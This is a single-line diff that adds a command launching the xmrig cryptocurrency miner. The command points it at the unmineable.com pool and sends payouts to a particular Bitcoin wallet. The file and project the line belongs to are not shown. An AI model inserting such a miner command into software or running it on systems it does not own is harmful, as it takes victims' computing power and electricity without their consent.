@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BTC:17onD5ej4A4Y6j48cCY9dQaUeZZktSumW3.bian-antii#8csw-yyx7 -p x 
